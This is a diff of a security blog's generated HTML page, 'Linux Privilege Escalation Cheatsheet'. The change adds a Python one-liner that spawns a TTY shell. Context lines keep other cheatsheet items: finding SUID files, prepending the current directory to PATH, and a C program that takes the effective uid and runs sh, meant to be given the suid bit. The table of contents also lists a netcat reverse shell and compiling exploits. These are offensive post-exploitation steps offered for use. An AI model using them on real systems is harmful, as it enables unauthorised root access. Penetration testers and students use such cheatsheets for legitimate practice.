@@ -6,25 +6,22 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="Searching for all SUID filesfind $DIRECTORY -perm /u=s,g=s
-Creating symlinkln -s /path/to/file /path/to/symlink
-Add current directory to PATH variableexport PATH=.:$PATH
-Create and compile C shell fil">
+    <meta name="description" content="Spawn TTY Shell with Pythonpython -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+Searching for all SUID filesfind $DIRECTORY -perm /u=s,g=s
+Creating symlinkln -s /path/to/file /path/to/symlin">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Linux Privilege Escalation Cheatsheet">
 <meta property="og:url" content="http://ostrokonskiy.tk/2016/12/30/linux-privilege-escalation-cheatsheet/index.html">
 <meta property="og:site_name" content="Security Notes">
-<meta property="og:description" content="Searching for all SUID filesfind $DIRECTORY -perm /u=s,g=s
-Creating symlinkln -s /path/to/file /path/to/symlink
-Add current directory to PATH variableexport PATH=.:$PATH
-Create and compile C shell fil">
-<meta property="og:updated_time" content="2017-01-19T15:43:57.551Z">
+<meta property="og:description" content="Spawn TTY Shell with Pythonpython -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+Searching for all SUID filesfind $DIRECTORY -perm /u=s,g=s
+Creating symlinkln -s /path/to/file /path/to/symlin">
+<meta property="og:updated_time" content="2017-01-24T21:15:08.202Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux Privilege Escalation Cheatsheet">
-<meta name="twitter:description" content="Searching for all SUID filesfind $DIRECTORY -perm /u=s,g=s
-Creating symlinkln -s /path/to/file /path/to/symlink
-Add current directory to PATH variableexport PATH=.:$PATH
-Create and compile C shell fil">
+<meta name="twitter:description" content="Spawn TTY Shell with Pythonpython -c &amp;#39;import pty; pty.spawn(&amp;quot;/bin/sh&amp;quot;)&amp;#39;
+Searching for all SUID filesfind $DIRECTORY -perm /u=s,g=s
+Creating symlinkln -s /path/to/file /path/to/symlin">
     
     
         
@@ -107,7 +104,7 @@ Create and compile C shell fil">
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-for-all-SUID-files"><span class="toc-number">1.</span> <span class="toc-text">Searching for all SUID files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-symlink"><span class="toc-number">2.</span> <span class="toc-text">Creating symlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-current-directory-to-PATH-variable"><span class="toc-number">3.</span> <span class="toc-text">Add current directory to PATH variable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-and-compile-C-shell-file"><span class="toc-number">4.</span> <span class="toc-text">Create and compile C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-suid-bit-to-C-shell-file"><span class="toc-number">5.</span> <span class="toc-text">Add suid bit to C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat-reverse-shell-if-no-‘-e’-or-‘-c’-options"><span class="toc-number">6.</span> <span class="toc-text">NetCat reverse shell if no ‘-e’ or ‘-c’ options</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-exploit-for-older-glibs"><span class="toc-number">7.</span> <span class="toc-text">Compile exploit for older glibs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resources"><span class="toc-number">8.</span> <span class="toc-text">Resources</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-TTY-Shell-with-Python"><span class="toc-number">1.</span> <span class="toc-text">Spawn TTY Shell with Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-for-all-SUID-files"><span class="toc-number">2.</span> <span class="toc-text">Searching for all SUID files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-symlink"><span class="toc-number">3.</span> <span class="toc-text">Creating symlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-current-directory-to-PATH-variable"><span class="toc-number">4.</span> <span class="toc-text">Add current directory to PATH variable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-and-compile-C-shell-file"><span class="toc-number">5.</span> <span class="toc-text">Create and compile C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-suid-bit-to-C-shell-file"><span class="toc-number">6.</span> <span class="toc-text">Add suid bit to C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat-reverse-shell-if-no-‘-e’-or-‘-c’-options"><span class="toc-number">7.</span> <span class="toc-text">NetCat reverse shell if no ‘-e’ or ‘-c’ options</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-exploit-for-older-glibs"><span class="toc-number">8.</span> <span class="toc-text">Compile exploit for older glibs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resources"><span class="toc-number">9.</span> <span class="toc-text">Resources</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -141,7 +138,8 @@ Create and compile C shell fil">
   
 
   <div class="content" itemprop="articleBody">
-    <h3 id="Searching-for-all-SUID-files"><a href="#Searching-for-all-SUID-files" class="headerlink" title="Searching for all SUID files"></a>Searching for all SUID files</h3><p><code>find $DIRECTORY -perm /u=s,g=s</code></p>
+    <h3 id="Spawn-TTY-Shell-with-Python"><a href="#Spawn-TTY-Shell-with-Python" class="headerlink" title="Spawn TTY Shell with Python"></a>Spawn TTY Shell with Python</h3><p><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code></p>
+<h3 id="Searching-for-all-SUID-files"><a href="#Searching-for-all-SUID-files" class="headerlink" title="Searching for all SUID files"></a>Searching for all SUID files</h3><p><code>find $DIRECTORY -perm /u=s,g=s</code></p>
 <h3 id="Creating-symlink"><a href="#Creating-symlink" class="headerlink" title="Creating symlink"></a>Creating symlink</h3><p><code>ln -s /path/to/file /path/to/symlink</code></p>
 <h3 id="Add-current-directory-to-PATH-variable"><a href="#Add-current-directory-to-PATH-variable" class="headerlink" title="Add current directory to PATH variable"></a>Add current directory to PATH variable</h3><p><code>export PATH=.:$PATH</code></p>
 <h3 id="Create-and-compile-C-shell-file"><a href="#Create-and-compile-C-shell-file" class="headerlink" title="Create and compile C shell file"></a>Create and compile C shell file</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">int</span> euid = geteuid();</div><div class="line">        setresuid(euid, euid, euid);</div><div class="line">        system(<span class="string">"sh"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
@@ -177,7 +175,7 @@ Create and compile C shell fil">
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-for-all-SUID-files"><span class="toc-number">1.</span> <span class="toc-text">Searching for all SUID files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-symlink"><span class="toc-number">2.</span> <span class="toc-text">Creating symlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-current-directory-to-PATH-variable"><span class="toc-number">3.</span> <span class="toc-text">Add current directory to PATH variable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-and-compile-C-shell-file"><span class="toc-number">4.</span> <span class="toc-text">Create and compile C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-suid-bit-to-C-shell-file"><span class="toc-number">5.</span> <span class="toc-text">Add suid bit to C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat-reverse-shell-if-no-‘-e’-or-‘-c’-options"><span class="toc-number">6.</span> <span class="toc-text">NetCat reverse shell if no ‘-e’ or ‘-c’ options</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-exploit-for-older-glibs"><span class="toc-number">7.</span> <span class="toc-text">Compile exploit for older glibs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resources"><span class="toc-number">8.</span> <span class="toc-text">Resources</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spawn-TTY-Shell-with-Python"><span class="toc-number">1.</span> <span class="toc-text">Spawn TTY Shell with Python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Searching-for-all-SUID-files"><span class="toc-number">2.</span> <span class="toc-text">Searching for all SUID files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Creating-symlink"><span class="toc-number">3.</span> <span class="toc-text">Creating symlink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-current-directory-to-PATH-variable"><span class="toc-number">4.</span> <span class="toc-text">Add current directory to PATH variable</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-and-compile-C-shell-file"><span class="toc-number">5.</span> <span class="toc-text">Create and compile C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Add-suid-bit-to-C-shell-file"><span class="toc-number">6.</span> <span class="toc-text">Add suid bit to C shell file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NetCat-reverse-shell-if-no-‘-e’-or-‘-c’-options"><span class="toc-number">7.</span> <span class="toc-text">NetCat reverse shell if no ‘-e’ or ‘-c’ options</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Compile-exploit-for-older-glibs"><span class="toc-number">8.</span> <span class="toc-text">Compile exploit for older glibs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Resources"><span class="toc-number">9.</span> <span class="toc-text">Resources</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
